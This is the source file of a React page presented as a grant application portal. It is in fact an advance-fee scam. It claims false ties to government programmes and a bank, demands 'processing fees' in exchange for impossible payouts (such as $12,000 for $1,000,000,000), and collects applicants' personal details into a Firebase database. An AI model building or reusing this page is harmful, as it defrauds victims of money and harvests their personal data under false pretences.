import React, { useState } from "react";
import { db } from "../firebase";
import { addDoc, collection, serverTimestamp } from "firebase/firestore";
import "./GrantApplicationPage.css";

export default function GrantApplicationPage() {
  const [selectedGrant, setSelectedGrant] = useState(null);
  const [showGrantModal, setShowGrantModal] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [showFormModal, setShowFormModal] = useState(false);
  const [showPendingModal, setShowPendingModal] = useState(false);
  const [selectedOption, setSelectedOption] = useState(null);

  const [formData, setFormData] = useState({
    FullName: "",
    Address: "",
    Gender: "",
    Age: "",
    MaritalStatus: "",
    PhoneNumber: "",
    Email: "",
    Disability: "",
    DoYouOwnAHouseOrRentedAppartment: "",
    cashOrCheck: "",
  });

  const grants = [
    { name: "Startup Empowerment Grant" },
    { name: "Business Growth Grant" },
    { name: "Family Support Grant" },
    { name: "Agriculture & Farmer Grant" },
    { name: "Healthcare Workers Grant" },
    { name: "Education Assistance Grant" },
  ];

  const options = [
    { pay: "$500", get: "$22,000" },
    { pay: "$1,000", get: "$50,000,000" },
    { pay: "$2,000", get: "$90,000,000" },
    { pay: "$3,000", get: "$100,000,000" },
    { pay: "$4,000", get: "$150,000,000" },
    { pay: "$5,000", get: "$200,000,000" },
    { pay: "$6,000", get: "$300,000,000" },
    { pay: "$7,000", get: "$450,000,000" },
    { pay: "$8,000", get: "$550,000,000" },
    { pay: "$9,200", get: "$750,000,000" },
    { pay: "$12,000", get: "$1,000,000,000" },
  ];

  const handleGrantClick = (grant) => {
    setSelectedGrant(grant);
    setShowGrantModal(true);
  };

  const handleSelectOption = (option) => {
    setSelectedOption(option);
    setShowGrantModal(false);
    setShowPaymentModal(true);
  };

  const handlePaymentChoice = (choice) => {
    setFormData({ ...formData, cashOrCheck: choice });
    setShowPaymentModal(false);
    setShowFormModal(true);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    await addDoc(collection(db, "grantApplications"), {
      grantType: selectedGrant.name,
      paymentOption: selectedOption,
      ...formData,
      status: "pending",
      createdAt: serverTimestamp(),
    });
    setShowFormModal(false);
    setShowPendingModal(true);
  };

  return (
    <div className="grant-page">
      <div className="hero" data-aos="fade-up">
        <h1>Apply for a Grant</h1>
      </div>

      <section className="affiliate-info" data-aos="fade-up">
        <h2>Affiliate Partnership Structure</h2>
        <p>
          We operate as an affiliate program in partnership with <strong> Government Global Programs and diverse institutions</strong>, as a trusted financial institution.
        </p>
        <p>
          This partnership allows us to leverage the bank’s infrastructure for grant processing, compliance verification, and secure disbursement of funds.
        </p>

        <h2>How It Works for You</h2>
        <ul>
          <li>Submit your application through our platform.</li>
          <li>Your application is verified and processed in partnership with Our Affliates.</li>
          <li>Approved grants are disbursed directly to your designated account securely.</li>
        </ul>

        <h2>Why the Partnership Matters</h2>
        <ul>
          <li>Funds are handled safely by a reputable bank.</li>
          <li>Maintains program efficiency, integrity, and sustainability.</li>
          <li>Ensures a seamless application experience with reliable disbursement.</li>
        </ul>

        <h2>Transparency Note on Fees</h2>
        <p>
          A standard <strong>Grant Processing & Verification Fee</strong> is applied to all applications to cover administrative, compliance, and disbursement costs. 
          This ensures the program remains sustainable and capable of supporting more applicants. To ensure the integrity, 
          efficiency, and sustainability of our grant program, a processing fee is applied to all grant applications. 
          This fee covers essential services including application verification, compliance checks, fund disbursement, and 
          ongoing program management. The fee also allows us to maintain and 
          expand our program to continue supporting businesses, farmers, NGOs, entrepreneurs, and other beneficiaries.
        </p>
      </section>

      <section className="grant-list" data-aos="fade-up">
        {grants.map((grant, index) => (
          <div
            key={index}
            className="grant-card"
            onClick={() => handleGrantClick(grant)}
          >
            <h3>{grant.name}</h3>
            <button>Apply Now</button>
          </div>
        ))}
      </section>
{/* 
      <Section>
        <h3>Select your Grant Category</h3>
        <h4>Fill in your details then submit</h4>
      </Section> */}

      {/* Grant Modal */}
      {showGrantModal && (
        <div className="modal">
          <div className="modal-content scrollable" data-aos="fade-up">
            <h2>Select Grant Option</h2>
            <ul className="option-list">
              {options.map((opt, i) => (
                <li key={i} onClick={() => handleSelectOption(opt)}>
                  Pay <strong>{opt.pay}</strong> → Get <strong>{opt.get}</strong>
                </li>
              ))}
            </ul>
            <button className="close-btn" onClick={() => setShowGrantModal(false)}>Close</button>
          </div>
        </div>
      )}

      {/* Payment Modal */}
      {showPaymentModal && (
        <div className="modal">
          <div className="modal-content" data-aos="fade-up">
            <h2>Select Payment Method</h2>
            <div className="payment-options">
              <button onClick={() => handlePaymentChoice("Cash")}>Cash</button>
              <button onClick={() => handlePaymentChoice("Check")}>Check</button>
            </div>
          </div>
        </div>
      )}

      {/* Form Modal */}
      {showFormModal && (
        <div className="modal">
          <div className="modal-content scrollable" data-aos="fade-up">
            <h2>Your Details</h2>
            <form onSubmit={handleSubmit}>
              {Object.keys(formData).map(
                (field) =>
                  field !== "cashOrCheck" && (
                    <input
                      key={field}
                      type="text"
                      placeholder={field.replace(/([A-Z])/g, " $1")}
                      value={formData[field]}
                      onChange={(e) =>
                        setFormData({ ...formData, [field]: e.target.value })
                      }
                      required
                    />
                  )
              )}
              <button type="submit" className="submit-btn">Submit Application</button>
            </form>
          </div>
        </div>
      )}

      {/* Pending Modal */}
      {showPendingModal && (
        <div className="modal">
          <div className="modal-content" data-aos="fade-up">
            <h2>Application Submitted</h2>
            <p>Your grant request is now pending admin review.</p>
            <button onClick={() => setShowPendingModal(false)}>OK</button>
          </div>
        </div>
      )}
    </div>
  );
}
